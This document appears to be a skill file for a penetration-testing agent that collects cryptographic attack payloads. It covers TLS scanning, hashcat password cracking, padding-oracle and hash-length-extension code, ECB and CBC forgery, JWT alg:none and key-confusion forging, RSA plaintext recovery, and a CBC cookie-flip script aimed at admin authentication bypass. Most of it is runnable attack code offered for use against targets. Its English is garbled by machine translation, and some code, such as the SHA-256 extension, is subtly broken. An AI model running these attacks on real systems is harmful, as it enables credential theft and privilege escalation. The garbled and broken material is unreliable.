# password学attackpayload / Cryptographic Attack Payloads

> thisfileas `SKILL.md` Supplementary Files，containsall password学attackpayload，byattacktypepartclass。

---

## 1. weakalgorithmDetect (SSL/TLS Scan)

### testssl.sh comprehensive Scan

```bash
# complete Scan -- protocol/passwordsetpiece/vulnerability/certificate
testssl.sh --full --quiet target.com

# onlyDetectprotocolversion
testssl.sh --protocols target.com
# dangerousinformationnumber: SSLv3/TLS 1.0/TLS 1.1 仍enable

# Detectalready knowvulnerability (Heartbleed/POODLE/Logjam etc.)
testssl.sh --vulnerabilities target.com

# Detectpasswordsetpiecestrongdegree
testssl.sh --ciphers target.com
# dangerousinformationnumber: RC4/DES/3DES/NULL passwordsetpiece
```

### openssl manual protocoldetect

```bash
# testing TLS 1.0
openssl s_client -connect target:443 -tls1

# testing SSLv3
openssl s_client -connect target:443 -ssl3

# testing TLS 1.2
openssl s_client -connect target:443 -tls1_2

# testing TLS 1.3
openssl s_client -connect target:443 -tls1_3

# Extractcertificateinformation
openssl s_client -connect target:443 -showcerts

# checkcertificateeffectiveperiod
echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -dates
```

### sslscan quick Scan

```bash
# allamount TLS configurationScan
sslscan target.com

# filterweakprotocol
sslscan target.com | grep -E "SSLv3|TLS 1.0|TLS 1.1"

# filterweakpasswordsetpiece
sslscan target.com | grep -E "RC4|DES|NULL|EXPORT"
```

---

## 2. hashIdentifyandcrack

### hashtypeIdentify

```bash
# interactivehashIdentifyTool
hash-identifier
# inputhashValue，Toolreturncan can hashtype

# hashcat automated Identifymode
hashcat --identify hash.txt
# returncan can hashcat mode 编numberlist
```

### common hashmodequick reference

| hashtype | hashcat mode | exampleformat |
|----------|-------------|----------|
| MD5 | 0 | `e10adc3949ba59abbe56e057f20f883e` |
| SHA-1 | 100 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| SHA-256 | 1400 | `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8` |
| SHA-512 | 1800 | `9ba...` (128 hex chars) |
| NTLM | 1000 | `b4b9b02e6f09a9bd760f388b67351e2b` |
| bcrypt | 3200 | `$2a$05$MBCmG...` |
| MySQL 4.1+ | 300 | `*6C8989366EAFD6C...` |
| JWT (HS256) | 16500 | `eyJhbG...signature` |

### dictionary attack

```bash
# MD5 dictionarycrack
hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt

# SHA-1 dictionarycrack
hashcat -a 0 -m 100 sha1_hashes.txt rockyou.txt

# SHA-256 dictionarycrack
hashcat -a 0 -m 1400 sha256_hashes.txt rockyou.txt

# NTLM dictionarycrack
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt
```

### ruleattack (enhancecoveringrate)

```bash
# use best64 rule
hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt -r best64.rule

# use dive rule (morecomprehensive ，耗when morelength)
hashcat -a 0 -m 0 md5_hashes.txt rockyou.txt -r dive.rule

# groupcombinemultipleitemrule
hashcat -a 0 -m 100 sha1_hashes.txt rockyou.txt -r best64.rule -r toggles1.rule
```

### maskbrute force

```bash
# 6 bitpurenumberword PIN
hashcat -a 3 -m 0 hash.txt ?d?d?d?d?d?d

# 8 bitsmallwriteword母
hashcat -a 3 -m 0 hash.txt ?l?l?l?l?l?l?l?l

# common passwordmode: 首word母largewrite + 5bitsmallwrite + 2bitnumberword
hashcat -a 3 -m 100 hash.txt ?u?l?l?l?l?l?d?d
```

### bcrypt crack (requires GPU，speeddegree慢)

```bash
# bcrypt $2a$ crack
hashcat -a 0 -m 3200 bcrypt_hashes.txt rockyou.txt

# note: bcrypt designascalculatesecretset，crackspeeddegree约 ~10K/s (GPU)
# phasethan MD5 ~100GH/s，bcrypt crack成thisextremelyhigh
```

---

## 3. Padding Oracle attack

### padbuster automated attack

```bash
# Basic Usage: URL encryptionsamplethis blocksize [option]
padbuster http://target/page?data=ENC ENC 8 -encoding 0

# specifytargetplaintext (encryptionarbitrarydata)
padbuster http://target/page?data=ENC ENC 8 \
  -encoding 0 -plaintext "admin=true"

# use cookies (requiresauthentication Oracle)
padbuster http://target/page?data=ENC ENC 8 \
  -encoding 0 -cookies "session=abc123"

# use POST request
padbuster http://target/page ENC 8 \
  -encoding 0 -post "data=ENC"
```

### attackprinciple

```
Padding Oracle 攻击原理:

1. 篡改前一密文块的字节 -> 影响当前块解密
2. 服务端返回"填充有效/无效"不同响应 (Oracle)
3. 逐字节推导中间值 (intermediate value)
4. 中间值 XOR 前一密文块 -> 得到明文
5. 无需知道密钥，仅依赖 Oracle 泄露的 1-bit 信息

适用条件:
- 服务端对填充错误返回不同错误信息
- 或: 填充错误和正常错误响应时间不同 (Timing Oracle)
- 常见框架: ASP.NET (历代版本), Java Cipher, PHP mcrypt
```

### manual Padding Oracle (Python scriptframework)

```python
import requests

def padding_oracle_attack(ciphertext, block_size, oracle_fn):
    """
    通用 Padding Oracle 攻击框架
    ciphertext: bytes, 至少 2 个块
    block_size: int, 通常 8 或 16
    oracle_fn: function, 接受密文返回 True(填充有效)/False
    """
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    plaintext = b""

    for block_idx in range(1, len(blocks)):
        intermediate = bytearray(block_size)
        prev_block = bytearray(blocks[block_idx - 1])

        for byte_pos in range(block_size - 1, -1, -1):
            padding_val = block_size - byte_pos
 # constructtestingblock
            test_block = bytearray(block_size)
            for k in range(byte_pos + 1, block_size):
                test_block[k] = intermediate[k] ^ padding_val

            found = False
            for guess in range(256):
                test_block[byte_pos] = guess
                crafted = bytes(test_block) + blocks[block_idx]
                if oracle_fn(crafted):
                    intermediate[byte_pos] = guess ^ padding_val
                    found = True
                    break

            if not found:
                raise Exception(f"Oracle failed at byte {byte_pos}")

 # XOR inintervalValueandbeforeaciphertextblock得toplaintext
        plain_block = bytes(a ^ b for a, b in zip(intermediate, prev_block))
        plaintext += plain_block

    return plaintext
```

---

## 4. Hash Length Extension attack

### htlea Tooluse

```bash
# Hash Length Extension attack (SHA-1)
# parameter: algorithm rawhash rawdatalengthdegree 追adddata
python3 htlea.py sha1 \
  "original_hash_value" \
  "original_data_length" \
  "&admin=true"

# MD5 Length Extension
python3 htlea.py md5 \
  "5d41402abc4b2a76b9719d911017c592" \
  5 \
  "&role=admin"
```

### attackprinciple

```
Hash Length Extension 攻击原理:

适用条件:
- 使用 Merkle-Damgard 构造的哈希函数 (MD5/SHA-1/SHA-256)
- H(secret || message) 形式的 MAC (不安全的 MAC 构造)
- 攻击者知道哈希值和消息长度，但不知道 secret

攻击步骤:
1. 从已知哈希值恢复哈希函数内部状态
2. 追加填充 (padding) 使其与哈希函数内部对齐
3. 追加攻击者选择的数据
4. 继续哈希计算，得到合法的新哈希值
5. 服务器验证新哈希值 -> 通过

防御:
- 使用 HMAC (Hash-based MAC) 而非 H(key || message)
- HMAC 的双层哈希结构免疫 Length Extension 攻击
```

### manual SHA-256 Length Extension (Python)

```python
import struct
import hashlib

def sha256_padding(message_length):
    """计算 SHA-256 的填充字节"""
    padding = b'\x80'
    padding += b'\x00' * ((55 - message_length % 64) % 64)
    padding += struct.pack('>Q', message_length * 8)
    return padding

def sha256_extend(original_hash, original_length, append_data):
    """
    SHA-256 Length Extension 攻击
    original_hash: hex string, 原始 H(secret || message)
    original_length: int, secret + message 的字节长度
    append_data: bytes, 要追加的数据
    """
 # fromhashValuerecovercomplexinternalstatus (h0-h7)
    h = bytes.fromhex(original_hash)
    h0, h1, h2, h3, h4, h5, h6, h7 = struct.unpack('>8I', h)

 # constructforgerymessage: original_data + padding + append_data
    glue_padding = sha256_padding(original_length)
    new_message_length = original_length + len(glue_padding) + len(append_data)

 # userecovercomplex statuscontinuecontinuehash append_data
    sha = hashlib.sha256()
    sha.h = (h0, h1, h2, h3, h4, h5, h6, h7)
    sha._message = append_data
    new_hash = sha.hexdigest()

    return glue_padding, append_data, new_hash
```

---

## 5. ECB modeDetectandexploit

### ECB modeDetect

```bash
# ECB modecharacteristic: identicalplaintextblockgenerateidenticalciphertextblock
# DetectStep:
# 1. commitrepeatplaintext (such as 16 A: AAAAAAAAAAAAAAAA)
# 2. observeciphertextiniswhetheroutputnowrepeatblock
# 3. such as resultciphertextoutputnowrepeatblock -> large概rateis ECB mode

# exampleDetect (assumptionthrough Web interface):
# input: username=AAAAAAAAAAAAAAAA&data=test
# observe: ciphertextinforshould "AAAAAAAAAAAAAAAA" blockiswhetherrepeat
```

### ECB Byte-at-a-time attack (CTF common )

```python
"""
ECB Byte-at-a-time 攻击
前提: 攻击者可以控制加密输入的前缀/后缀，且服务端使用 ECB 模式
"""
BLOCK_SIZE = 16

def ecb_byte_at_a_time(encrypt_fn, unknown_suffix):
    """
    encrypt_fn: function, 接受明文前缀返回密文
    unknown_suffix: 要恢复的未知后缀
    """
    recovered = b""

 # confirmnot knowdatalengthdegree
    baseline_len = len(encrypt_fn(b""))
    for i in range(1, BLOCK_SIZE + 1):
        if len(encrypt_fn(b"A" * i)) > baseline_len:
            hidden_len = baseline_len - i
            break

    for i in range(hidden_len):
 # constructpaddingmaketargetbyte落inblock末尾
        padding_len = BLOCK_SIZE - 1 - (i % BLOCK_SIZE)
        padding = b"A" * padding_len

 # obtaintargetblock ciphertext
        target_cipher = encrypt_fn(padding)
        block_idx = i // BLOCK_SIZE
        target_block = target_cipher[block_idx * BLOCK_SIZE:(block_idx + 1) * BLOCK_SIZE]

 # constructdictionary: forall can canbyteencryption
        known = padding + recovered
        for byte_val in range(256):
            candidate = known[-(BLOCK_SIZE - 1):] + bytes([byte_val])
            candidate_cipher = encrypt_fn(candidate)
            candidate_block = candidate_cipher[:BLOCK_SIZE]

            if candidate_block == target_block:
                recovered += bytes([byte_val])
                break

    return recovered
```

### ECB block重排attack

```bash
# ECB modenotprovidesintegrityprotect -> blockcan重排/replace
# attackscenario:
# raw: user=alice&role=user (2 block: "user=alice&role=" + "user\x00\x00\x00...")
# construct: 先register "user=alice&role=admin" forshould username
# 1. registerusername: "alice&role=admin&x=" (16 byte)
# 2. obtainforshouldciphertextblock
# 3. usecontains "admin" ciphertextblockreplaceraw Token in "user" block
# 4. serviceenddecryptionafter得to role=admin
```

---

## 6. JWT attack

### JWT decodeandreconnaissance

```bash
# use jwt_tool decode
python3 jwt_tool.py <TOKEN> -T

# manual decode (Base64URL)
echo "<HEADER_BASE64>" | base64 -d 2>/dev/null | python3 -m json.tool
echo "<PAYLOAD_BASE64>" | base64 -d 2>/dev/null | python3 -m json.tool
```

### alg:none bypass

```bash
# use jwt_tool automated construct alg:none Token
python3 jwt_tool.py <TOKEN> -X a

# manual construct (Python)
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'role':'admin','user':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

### Algorithm Confusion (RS256 -> HS256)

```bash
# use jwt_tool
python3 jwt_tool.py <TOKEN> -I -at HS256 -pc role -pv admin -k public_key.pem

# attackprinciple:
# 1. obtainserviceend RSA public key (typicallyfrom /.well-known/jwks.json orcertificateinExtract)
# 2. will JWT algorithmfrom RS256 改as HS256
# 3. use RSA public keyworkas HMAC keysignature
# 4. serviceendusesameapublic keyverify -> verifythrough
# 5. prerequisite: serviceendusesamea key variablehandling RSA and HMAC
```

### JWT keybrute force (HS256)

```bash
# Extract JWT to hashcat format
echo "<HEADER>.<PAYLOAD>.<SIGNATURE>" > jwt_hash.txt

# use hashcat mode 16500 brute force
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# use jwt_tool built-inbrute force
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

### JWT Payload tamper

```bash
# use jwt_tool modifyspecificField
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin

# modifymultipleField
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin -pc user -pv administrator

# when timestamptamper (延lengthoverperiodwhen interval)
python3 jwt_tool.py <TOKEN> -I -pc exp -pv 9999999999
```

---

## 7. RSA attack

### smallpublic keypointnumberattack (e=3)

```bash
# use RsaCtfTool Detectweak RSA parameter
python3 RsaCtfTool.py -n <MODULUS> -e 3 --attack small_exponent

# when e=3 andplaintext较smallwhen : m^e < n -> direct开立方rootrecovercomplexplaintext
python3 -c "
from gmpy2 import iroot
from Crypto.Util.number import long_to_bytes
c = <CIPHERTEXT_AS_INT>  # 密文
m, is_exact = iroot(c, 3)
if is_exact:
    print(long_to_bytes(m))
"
```

### RSA modenumberpartsolve (smallmodenumber)

```bash
# attemptpartsolvesmall RSA modenumber
python3 RsaCtfTool.py -n <MODULUS> -e 65537 --private

# use factordb onlinequery
# https://factordb.com/

# use yafu localpartsolve
yafu "factor(<MODULUS>)"
```

### Wiener attack (smallprivate keypointnumber)

```bash
# when d < n^(1/4)/3 when ，Wiener attackcan recovercomplexprivate key
python3 RsaCtfTool.py -n <MODULUS> -e <EXPONENT> --attack wiener
```

### 共modeattack (Same N, Different e)

```python
"""
RSA 共模攻击: 相同模数 N，不同指数 e1, e2 加密同一明文
前提: gcd(e1, e2) = 1
"""
from math import gcd
from Crypto.Util.number import long_to_bytes

def common_modulus_attack(c1, c2, e1, e2, n):
    assert gcd(e1, e2) == 1

 # extension欧几inside得algorithm: e1*s1 + e2*s2 = 1
    def extended_gcd(a, b):
        if b == 0:
            return a, 1, 0
        g, x, y = extended_gcd(b, a % b)
        return g, y, x - (a // b) * y

    _, s1, s2 = extended_gcd(e1, e2)

 # m = c1^s1 * c2^s2 mod n
    if s1 < 0:
        c1 = pow(c1, -1, n)
        s1 = -s1
    if s2 < 0:
        c2 = pow(c2, -1, n)
        s2 = -s2

    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    return long_to_bytes(m)
```

---

## 8. SSL/TLS testingcommandlargeall

### protocolversiontesting

```bash
# 逐testingprotocolversion
for proto in ssl3 tls1 tls1_1 tls1_2 tls1_3; do
  echo "Testing $proto..."
  echo | openssl s_client -connect target:443 -$proto 2>&1 | grep -E "Protocol|Cipher|error"
done
```

### passwordsetpieceEnumerate

```bash
# use nmap Enumeratepasswordsetpiece
nmap --script ssl-enum-ciphers -p 443 target.com

# use testssl.sh
testssl.sh --ciphers target.com

# use openssl 逐testing
openssl ciphers -v 'ALL:COMPLEMENTOFALL' | while read cipher rest; do
  echo | openssl s_client -connect target:443 -cipher "$cipher" 2>&1 | grep -q "Cipher.*$cipher" && echo "Supported: $cipher"
done
```

### Heartbleed Detect

```bash
# use testssl.sh
testssl.sh --heartbleed target.com

# use nmap
nmap --script ssl-heartbleed -p 443 target.com

# manual Detect (requires openssl 1.0.1 affectedimpactversion)
# orusespecializeduseTool:
python3 heartbleed.py target.com 443
```

### certificatechainverify

```bash
# checkcomplete certificatechain
openssl s_client -connect target:443 -showcerts

# verifycertificateeffectiveity
echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -text

# checkcertificate吊销 (CRL/OCSP)
openssl s_client -connect target:443 -status 2>/dev/null | grep "OCSP"
```

### HSTS / Security Headers check

```bash
# use curl checksecurity head
curl -sI https://target.com | grep -iE "strict-transport|content-security|x-frame"

# use testssl.sh check HTTP security head
testssl.sh --headers target.com
```

---

## 9. CBC Bit Flipping Attack

### Controlled Byte Manipulation

```python
"""
CBC Bit Flipping: Modify ciphertext byte to control decrypted plaintext.
Flipping bit at position i in block N changes the same position in decrypted block N+1.
Formula: target_byte = original_cipher_byte XOR original_plain_byte XOR desired_byte
"""
def cbc_bit_flip(ciphertext, block_size, byte_offset, original_byte, target_byte):
    """
    Flip a byte in the previous ciphertext block to alter decrypted plaintext.
    byte_offset: position within the target block (0-indexed)
    """
    ct = bytearray(ciphertext)
    # Modify the byte in the PREVIOUS block
    target_block_start = (byte_offset // block_size) * block_size
    prev_block_offset = target_block_start - block_size + (byte_offset % block_size)
    ct[prev_block_offset] ^= original_byte ^ target_byte
    return bytes(ct)

# Example: Change "role=user" to "role=admin" in encrypted cookie
# If plaintext block contains "user" at known offset
ciphertext = bytes.fromhex("aabbccdd...")  # intercepted ciphertext
modified = cbc_bit_flip(ciphertext, 16, 21, ord('u'), ord('a'))
```

### Authentication Bypass via CBC Flip

```python
"""
Practical CBC bit-flip attack against authentication tokens.
Target: encrypted cookie like "admin=0;username=guest"
Goal: flip "admin=0" to "admin=1"
"""
import requests

def exploit_cbc_auth_bypass(url, cookie_name, encrypted_cookie, block_size=16):
    """Flip the '0' in admin=0 to '1' to gain admin access."""
    ct = bytearray(bytes.fromhex(encrypted_cookie))

    # Position of '0' in "admin=0" within the plaintext
    # Assuming we know the offset (e.g., byte 6 in block 2)
    target_pos_in_prev_block = 6  # adjust based on analysis
    ct[target_pos_in_prev_block] ^= ord('0') ^ ord('1')

    modified_cookie = ct.hex()
    resp = requests.get(url, cookies={cookie_name: modified_cookie})
    return resp.text

# Detect CBC bit-flip vulnerability
def detect_cbc_bitflip(url, cookie_name, encrypted_cookie):
    """Flip random bytes and observe server behavior differences."""
    ct = bytearray(bytes.fromhex(encrypted_cookie))
    ct[0] ^= 0x01  # flip one bit in first byte
    resp = requests.get(url, cookies={cookie_name: ct.hex()})
    # If server returns padding error vs auth error -> vulnerable
    return resp.status_code, resp.text[:200]
```

### CBC IV Manipulation

```python
"""
When IV is user-controlled or prepended to ciphertext,
manipulating IV directly controls first plaintext block decryption.
"""
def cbc_iv_attack(iv, ciphertext, known_plaintext_block1, desired_plaintext):
    """
    Modify IV to change first decrypted block.
    iv: original IV (bytes)
    known_plaintext_block1: known first block plaintext
    desired_plaintext: what we want first block to decrypt to
    """
    new_iv = bytearray(len(iv))
    for i in range(len(iv)):
        new_iv[i] = iv[i] ^ known_plaintext_block1[i] ^ desired_plaintext[i]
    return bytes(new_iv)

# Example: token = IV || ciphertext, first block decrypts to "guest;admin=false"
# Goal: make it decrypt to "guest;admin=true\x01"
iv = bytes.fromhex("00112233445566778899aabbccddeeff")
known = b"guest;admin=fals"
target = b"guest;admin=true"
new_iv = cbc_iv_attack(iv, b"", known, target)
```

---

## 10. ECB Block Manipulation

### Cut-and-Paste Attack

```python
"""
ECB Cut-and-Paste: Since ECB encrypts blocks independently,
we can rearrange ciphertext blocks to forge valid encrypted data.
Classic example: forge admin role in structured data.
"""
BLOCK_SIZE = 16

def ecb_cut_and_paste_attack(encrypt_fn):
    """
    Forge admin profile using ECB block rearrangement.
    Assumes server encrypts: "email=X&uid=10&role=user"
    Goal: produce ciphertext that decrypts to role=admin
    """
    # Step 1: Craft email so "admin" + padding lands in its own block
    # "email=" = 6 bytes, need 10 more to fill block 1
    # Then "admin" + PKCS7 padding (11 bytes of \x0b) fills block 2
    admin_block_email = "A" * 10 + "admin" + "\x0b" * 11
    ct1 = encrypt_fn(admin_block_email)
    admin_block = ct1[16:32]  # extract the "admin\x0b..." block

    # Step 2: Craft email so "role=" ends exactly at block boundary
    # "email=X&uid=10&role=" = need email length that aligns
    # "email=" (6) + email + "&uid=10&role=" (13) = multiple of 16
    # 6 + email_len + 13 = 32 -> email_len = 13
    normal_email = "A" * 13
    ct2 = encrypt_fn(normal_email)

    # Step 3: Replace last block with admin block
    forged = ct2[:32] + admin_block
    return forged
```

### ECB Block Reordering for Privilege Escalation

```python
"""
ECB block reordering attack against session tokens.
If token = ECB(user_data), blocks can be swapped to alter meaning.
"""
def ecb_block_reorder(ciphertext, block_size=16):
    """
    Reorder ECB blocks to change decrypted structure.
    Example: swap block containing 'role=user' with crafted 'role=admin' block.
    """
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]

    # Swap blocks (example: move block 3 to position 1)
    # This changes the decrypted field ordering
    reordered = blocks[0] + blocks[2] + blocks[1] + b"".join(blocks[3:])
    return reordered

def ecb_duplicate_block(ciphertext, source_idx, target_idx, block_size=16):
    """Duplicate a known block to overwrite another position."""
    blocks = [bytearray(ciphertext[i:i+block_size]) for i in range(0, len(ciphertext), block_size)]
    blocks[target_idx] = blocks[source_idx]
    return b"".join(bytes(b) for b in blocks)
```

### ECB Chosen-Plaintext Dictionary Attack

```bash
# Detect ECB mode by submitting repeated blocks
# If input "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" (32+ identical bytes)
# produces repeated ciphertext blocks -> ECB confirmed

# Automated ECB detection
python3 -c "
import requests
payload = 'A' * 48  # 3 identical blocks
resp = requests.post('http://target/encrypt', data={'input': payload})
ct = bytes.fromhex(resp.text)
blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
if len(blocks) != len(set(blocks)):
    print('ECB MODE DETECTED: repeated ciphertext blocks found')
else:
    print('Not ECB (or block size differs)')
"
```

---

## 11. RSA Attacks

### Small Exponent Attack (e=3, Hastad's Broadcast)

```python
"""
Hastad's Broadcast Attack: When same message is encrypted with e=3
to 3 different recipients (same e, different n), recover plaintext via CRT.
"""
from sympy.ntheory.modular import crt
from gmpy2 import iroot
from Crypto.Util.number import long_to_bytes

def hastad_broadcast(ciphertexts, moduli, e=3):
    """
    ciphertexts: list of c values [c1, c2, c3]
    moduli: list of n values [n1, n2, n3]
    e: public exponent (typically 3)
    """
    # Use Chinese Remainder Theorem to find m^e mod (n1*n2*n3)
    combined_modulus = moduli[0] * moduli[1] * moduli[2]
    remainders = ciphertexts
    result = crt(moduli, remainders)
    m_cubed = result[1] if isinstance(result, tuple) else result

    # Take e-th root
    m, exact = iroot(int(m_cubed), e)
    if exact:
        return long_to_bytes(int(m))
    return None

# Example usage
c1, c2, c3 = 123456, 789012, 345678  # ciphertexts
n1, n2, n3 = 1000003, 1000033, 1000037  # moduli
plaintext = hastad_broadcast([c1, c2, c3], [n1, n2, n3])
```

### Bleichenbacher RSA PKCS#1 v1.5 Attack

```python
"""
Bleichenbacher's attack against RSA PKCS#1 v1.5 padding.
Requires a padding oracle (server distinguishes valid/invalid PKCS padding).
Adaptive chosen-ciphertext attack to decrypt RSA ciphertext.
"""
from Crypto.Util.number import bytes_to_long, long_to_bytes

def bleichenbacher_oracle_check(ciphertext_int, n, e, oracle_fn):
    """
    oracle_fn: returns True if decrypted ciphertext has valid PKCS#1 v1.5 padding
    (starts with 0x00 0x02)
    """
    return oracle_fn(ciphertext_int)

def bleichenbacher_step2a(c, n, e, B, oracle_fn):
    """Find smallest s1 >= n/(3B) such that c * s1^e mod n has valid padding."""
    s = (n + 3 * B - 1) // (3 * B)
    while True:
        candidate = (c * pow(s, e, n)) % n
        if oracle_fn(candidate):
            return s
        s += 1

# Detection: send modified ciphertext and observe different error responses
# If server returns "decryption error" vs "padding error" -> vulnerable
```

### Coppersmith Short Pad Attack

```python
"""
Coppersmith's short pad attack: When RSA message has small unknown padding,
use lattice reduction to recover plaintext.
Requires: same message sent twice with different short random padding.
"""
from sage.all import *

def coppersmith_short_pad(c1, c2, e, n, pad_bits=64):
    """
    c1 = (m + r1)^e mod n
    c2 = (m + r2)^e mod n
    Recover m when r1, r2 are small (< 2^pad_bits)
    """
    PRx = PolynomialRing(Zmod(n), 'x')
    x = PRx.gen()

    # Franklin-Reiter related message attack
    # If m2 = m1 + diff (known relationship)
    # Then gcd(x^e - c1, (x+diff)^e - c2) reveals m1
    # For unknown diff, use resultant/lattice methods

    # Simplified: if e=3 and padding is short
    g1 = x**e - c1
    g2 = (x + 1)**e - c2  # assuming diff=1 for demonstration

    # Compute GCD in polynomial ring
    result = g1.gcd(g2)
    if result.degree() == 1:
        m = -result.monic().constant_coefficient()
        return int(m)
    return None
```

### RSA Key Recovery from Partial Information

```bash
# Extract RSA public key from certificate
openssl x509 -in cert.pem -noout -pubkey > pubkey.pem

# Extract modulus and exponent from public key
openssl rsa -pubin -in pubkey.pem -text -noout

# Factor weak RSA key using RsaCtfTool
python3 RsaCtfTool.py --publickey pubkey.pem --private

# Check if modulus is in factordb
python3 -c "
from Crypto.PublicKey import RSA
key = RSA.import_key(open('pubkey.pem').read())
print(f'n = {key.n}')
print(f'e = {key.e}')
print(f'Key size: {key.size_in_bits()} bits')
# Submit n to http://factordb.com/
"

# Fermat factorization (when p and q are close)
python3 RsaCtfTool.py -n <MODULUS> -e 65537 --attack fermat
```

---

## 12. Key Derivation Weaknesses

### Weak KDF Parameters Detection

```python
"""
Detect weak key derivation function parameters.
Common issues: low iteration count, missing salt, weak algorithm.
"""
import hashlib
import time

def audit_kdf_strength(password, salt, iterations, algorithm='sha256'):
    """Measure KDF computation time - if too fast, parameters are weak."""
    start = time.time()
    hashlib.pbkdf2_hmac(algorithm, password.encode(), salt, iterations)
    elapsed = time.time() - start

    findings = []
    if iterations < 100000:
        findings.append(f"WEAK: iterations={iterations} (recommend >= 600000 for PBKDF2-SHA256)")
    if len(salt) < 16:
        findings.append(f"WEAK: salt length={len(salt)} bytes (recommend >= 16)")
    if elapsed < 0.1:
        findings.append(f"WEAK: KDF completes in {elapsed:.4f}s (should take >= 0.1s)")
    if algorithm in ('md5', 'sha1'):
        findings.append(f"WEAK: using {algorithm} (recommend SHA-256 or SHA-512)")
    return findings

# Test common weak configurations
print(audit_kdf_strength("password", b"salt", 1000))  # Too few iterations
print(audit_kdf_strength("password", b"ab", 100000))  # Salt too short
```

### Salt Reuse and Predictable Salt Detection

```python
"""
Detect salt reuse across multiple password hashes.
Salt reuse allows precomputation attacks against multiple users.
"""
import re
from collections import Counter

def detect_salt_reuse(hash_file):
    """Analyze password hash file for salt reuse patterns."""
    salts = []
    with open(hash_file) as f:
        for line in f:
            # bcrypt format: $2a$rounds$salt_22_chars_hash
            match = re.match(r'\$2[aby]\$(\d+)\$(.{22})', line.strip())
            if match:
                salts.append(match.group(2))
                continue
            # PBKDF2 format: algorithm$iterations$salt$hash
            match = re.match(r'pbkdf2_sha256\$(\d+)\$([^$]+)\$', line.strip())
            if match:
                salts.append(match.group(2))

    salt_counts = Counter(salts)
    reused = {s: c for s, c in salt_counts.items() if c > 1}
    if reused:
        print(f"CRITICAL: Salt reuse detected! {len(reused)} salts used multiple times")
        for salt, count in reused.items():
            print(f"  Salt '{salt[:8]}...' used {count} times")
    return reused
```

### Insufficient Iteration Count Exploitation

```bash
# Benchmark PBKDF2 cracking speed at various iteration counts
hashcat -m 10900 -a 0 --benchmark  # PBKDF2-HMAC-SHA256

# Crack PBKDF2 with low iterations (1000 iterations = fast cracking)
hashcat -m 10900 -a 0 pbkdf2_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack bcrypt with low cost factor ($2a$04$ = only 16 rounds)
hashcat -m 3200 -a 0 bcrypt_low_cost.txt /usr/share/wordlists/rockyou.txt

# Compare: bcrypt cost=4 vs cost=12 cracking speed
# cost=4: ~1M hashes/sec on GPU
# cost=12: ~15 hashes/sec on GPU
echo "Low cost bcrypt is 65000x faster to crack"
```

### Weak KDF Algorithm Identification

```bash
# Identify KDF algorithm from hash format
python3 -c "
import sys
hash_samples = [
    '\$2a\$04\$',      # bcrypt cost=4 (WEAK: minimum recommended is 10)
    '\$2a\$12\$',      # bcrypt cost=12 (OK)
    'pbkdf2:sha1:1000', # PBKDF2-SHA1 1000 iterations (WEAK)
    'pbkdf2_sha256\$10000\$',  # PBKDF2-SHA256 10000 iter (WEAK: recommend 600000)
    'scrypt:N=1024:',   # scrypt N=1024 (WEAK: recommend N=32768+)
    'argon2id\$v=19\$m=16384,t=2,p=1',  # Argon2id (check params)
]
for h in hash_samples:
    print(f'Pattern: {h}')
"

# Extract and audit Django password hashes
python3 -c "
# Django default: pbkdf2_sha256\$iterations\$salt\$hash
import re
with open('auth_user.csv') as f:
    for line in f:
        match = re.search(r'pbkdf2_sha256\\\$(\d+)\\\$', line)
        if match and int(match.group(1)) < 260000:
            print(f'WEAK iterations: {match.group(1)}')
"
```
